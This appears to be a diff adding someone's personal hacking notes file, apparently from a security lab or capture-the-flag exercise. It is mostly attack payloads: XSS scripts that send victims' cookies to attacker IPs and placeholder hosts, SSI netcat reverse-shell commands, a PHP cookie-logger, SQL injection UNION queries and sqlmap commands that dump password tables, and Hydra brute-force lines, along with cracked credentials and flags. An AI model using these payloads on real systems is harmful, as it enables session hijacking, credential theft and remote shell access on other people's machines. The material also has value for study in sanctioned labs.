@@ -1,0 +1,289 @@
+378nsf0vv4tfnndjfmtcu8qa20
+
+https://www.perlscriptsjavascripts.com/js/cookies.html
+
+http://stackoverflow.com/questions/3400759/how-can-i-list-all-cookies-for-the-current-page-with-javascript
+
+http://stackoverflow.com/questions/6383933/curl-get-cookies-into-file
+
+https://www.safeskyhacks.com/Forums/showthread.php?223-Fast-and-easy-XSS-exploitation-with-netcat
+
+http://knoxd3.blogspot.com/2013/07/how-to-use-ncat-in-kali-linux.html
+
+http://ifconfig.dk/cross-site-scripting/
+
+--------------------
+
+<sCriPt type="text/javascript">
+<!--
+  
+function getCookie(w){
+	cName = "";
+	pCOOKIES = new Array();
+	pCOOKIES = document.cookie.split('; ');
+	for(bb = 0; bb < pCOOKIES.length; bb++){
+		NmeVal  = new Array();
+		NmeVal  = pCOOKIES[bb].split('=');
+		if(NmeVal[0] == w){
+			cName = unescape(NmeVal[1]);
+		}
+	}
+	return cName;
+}
+
+function printCookies(w){
+	cStr = "";
+	pCOOKIES = new Array();
+	pCOOKIES = document.cookie.split('; ');
+	for(bb = 0; bb < pCOOKIES.length; bb++){
+		NmeVal  = new Array();
+		NmeVal  = pCOOKIES[bb].split('=');
+		if(NmeVal[0]){
+			cStr += NmeVal[0] + '=' + unescape(NmeVal[1]) + '; ';
+		}
+	}
+	return cStr;
+}
+
+function setCookie(name, value, expires, path, domain, secure){
+	cookieStr = name + "=" + escape(value) + "; ";
+	
+	if(expires){
+		expires = setExpiration(expires);
+		cookieStr += "expires=" + expires + "; ";
+	}
+	if(path){
+		cookieStr += "path=" + path + "; ";
+	}
+	if(domain){
+		cookieStr += "domain=" + domain + "; ";
+	}
+	if(secure){
+		cookieStr += "secure; ";
+	}
+	
+	document.cookie = cookieStr;
+}
+
+function setExpiration(cookieLife){
+    var today = new Date();
+    var expr = new Date(today.getTime() + cookieLife * 24 * 60 * 60 * 1000);
+    return  expr.toGMTString();
+}
+
+allCookies = printCookies();
+document.write(allCookies);
+alert(allCookies);
+// -->
+
+</scRipt>
+--------------
+
+.shtml
+
+<!--#exec cmd="nc 128.197.52.153 1989 -e /bin/bash"-->
+
+-----------------------------
+
+Woot.shtml
+<a href="http://10.241.4.68/hidden/hidden.php">SSP</a>
+
+----------------------
+
+<img src="http://1964.alumclass.mit.edu/s/1314/images/gid55/editor/east_campus/6104EC.jpg">
+
+<ScripT>document.write(document.cookie)</ScriPt>
+
+<ScripT>document.write('<iMg sr'+'c="http://1964.alumclass.mit.edu/s/1314/images/gid55/editor/east_campus/6104EC.jpg"/>')</ScriPt>
+
+<script>new Image().src=”http://128.197.52.153/cookie.php?”+document.cookie;</script>
+
+<scRipt>document.location="http://128.197.52.153:1989/myphp.php?cookie="+document.cookie+"&from="+document.location;</scrIpt>  
+
+<SripT>document.write('new Image().sr'+'c="http://128.197.52.153:1989/myphp.php?"+document.cookie');</ScriPt>
+
+ukip.org/search?q=<script>var one="http://myserver.com:1338/index.html?cookie=";var two=document.cookie;document.location=one.concat(two);</script>&x=0&y=0  
+
+<script>var one="http://attackerip:port/index.html?cookie=";var two=document.cookie;document.location=one.concat(two);</script>  
+
+<scrIpt>var one='new Image().sr';var two='c="http://128.197.52.153:1989
+/myphp.php?"+document.cookie';document.location=one.concat(two);</sCript> 
+
+Your Super Secret Password is 'BCIKBJHKFCKBFD' 
+
+<scrIpt>$.post('http://172.16.30.129:1989/?cookie='+document.cookie)</scrIpt>
+
+
+
+<scrIpt>$window.location('http://128.197.52.153:1989/?cookie='+document.cookie)</scrIpt>
+
+<ScriPt>window.location="http://128.197.52.153:1989?cookie'+escape(document.cookie);<ScripT>
+
+ID_my_site=admin; Key_my_site=NoWayYouWillCrakThis%21
+
+NoWayYouWillCrakThis!
+
+congrats, you're admin! my favorite movie quote is "hack_th3_pl4n3t" 
+
+<!--#exec cmd="nc -lp 1989 -e /bin/bash"-->
+nc 10.241.13.201 1989
+
+nc -v -l -p 80
+<scrIpt>window.location="http://128.197.55.120/cookie.php?"+document.cookie</scrIpt>
+
+Transfer files:
+receiving: nc -l 1989 > file.txt
+sending: nc $ip $port < file.txt OR scp file.txt user@ip:/home/dir
+
+http://pentestmonkey.net/category/cheat-sheet
+
+-------------------
+
+SQLi:
+
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+sqlmap -u http://10.241.4.74/show.php?username= -f -b -D users -T user -C username name --dump
+
+
+http://10.241.4.74/show.php?username=Joe%27%20OR%20%271=1
+
+' UNION SELECT 1,2,3,4, schema_name, 6, 7, 8 FROM information_schema.schemata#'
+UNION SELECT 1,2,3,4, USER(), 6, 7, 8 FROM orders#'
+' UNION SELECT 1,2,3,4, PASS(), 6, 7, 8 FROM orders#'
+' UNION SELECT 1,2,3,4, USER(), 6, 7, 8 FROM orders#'
+' UNION SELECT 1,2,3,4, VERSION(), 6, 7, 8 FROM orders#'
+' UNION SELECT 1,2,3,4, username, password, 7, 8 FROM securelab.users#'
+' UNION SELECT 1,2,3,4, username, password, 7, 8 FROM mysql.users#'
+
+1' UNION SELECT * FROM orders WHERE order.user_id=1 '
+' UNION SELECT 1,2,3,4, count(users), 6, 7, 8 FROM information_schema#'
+' UNION SELECT 1,2,3,4, schema_owner, 6, 7, 8 FROM information_schema.schemata#'
+' UNION SELECT 1,2,3,4,users, password, 7, 8 FROM mysql.users#'
+' UNION SELECT 1,2,3,4, sql_path, 6, 7, 8 FROM information_schema.schemata#'
+UNION SELECT 1,2,3,4, CURRENT_USER(), 6, 7, 8 FROM orders#'
+' UNION SELECT 1,2,3,4, CURRENT_TIMESTAMP, 6, 7, 8 FROM orders#'
+
+sqlmap -u http://10.241.4.74/index.php?id=1 -f -b --current-user --current-db --users --passwords --dbs -v 0 
+-u: Target
+-f: Extensively fingerprint the backend DBMS
+-b: Retrieve DBMS banner
+-v: Output verbosity level (0, warning; 2, debug)
+
+sqlmap -u http://10.241.4.74/show.php?username= -f -b --passwords -U alentino --union-use -v 2
+
+-U: specify db user (CU, alias for current user)
+--union-use: retrieve data via Union querysqli, if possible
+
+SQLi:
+
+http://www.sqlinjection.net/sqlmap/tutorial/
+
+https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/
+
+the p option can be used in the following way
+
+-u "http://localhost/vuln/test.php?feature=music&song=1" -p song
+
+I have this problem too. I think sqlmap inject the first parameter. If you type :
+
+-u http://localhost/vuln/test.php?feature=music&song=1
+
+sqlmap will inject 'feature' parameter. To make it inject 'song' parameter you need to reorder the parameter as follows :
+
+-u http://localhost/vuln/test.php?song=1&feature=music
+
+Dont forget to add '&' between each parameter. It worked for me.
+wn vot
+	
+
+You can simply add * to your value of parameter which you want to scan. 
+ 
+	
+-u localhost/vuln/test.php?feature=music&song=1* if it is kind of POST request -u localhost/vuln/test.php --data="feature=music&song=1*"
+
+
+
+----------------------
+
+Hydra:
+
+https://www.thc.org/thc-hydra/
+ For those people testing with DVWA, this is what you want:
+          hydra -l admin -p password   http-get-form "/dvwa/login.php:username=^USER^&password=^PASS^&submit=Login:Login failed"
+
+hydra -l ftp -x 3:3:a ftp://localhost/
+hydra -t 5 -V -f -l root -P /root/Desktop/pass.lst ftp://10.241.13.21
+
+http://www.drchaos.com/breaking-ssh-vnc-and-other-passwords-with-kali-linux-and-hydra/
+
+
+-------------
+
+mphp.php
+
+#!/user/local/bin/php -q
+
+<?php
+while true; do { echo -e 'HTTP/1.1 200 OK\r\n'& cat myphp.php; } | nc -l -p 1337 -q 1 ; done
+?>
+
+-----------------
+
+https://docs.python.org/2/library/simplehttpserver.html
+
+-------------------------------
+cookielogger.php
+
+<?php
+
+function GetIP()
+{
+if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
+$ip = getenv("HTTP_CLIENT_IP");
+else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
+$ip = getenv("HTTP_X_FORWARDED_FOR");
+else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
+$ip = getenv("REMOTE_ADDR");
+else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
+$ip = $_SERVER['REMOTE_ADDR'];
+else
+$ip = "unknown";
+return($ip);
+}
+
+function logData()
+{
+$ipLog="log.txt";
+$cookie = $_SERVER['QUERY_STRING'];
+$register_globals = (bool) ini_get('register_gobals');
+if ($register_globals) $ip = getenv('REMOTE_ADDR');
+else $ip = GetIP();
+
+$rem_port = $_SERVER['REMOTE_PORT'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$rqst_method = $_SERVER['METHOD'];
+$rem_host = $_SERVER['REMOTE_HOST'];
+$referer = $_SERVER['HTTP_REFERER'];
+$date=date ("l dS of F Y h:i:s A");
+$log=fopen("$ipLog", "a+");
+
+if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
+fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie
+");
+else
+fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
+fclose($log);
+}
+
+logData();
+
+-------------------
+
+
+
+
+
+
+
+
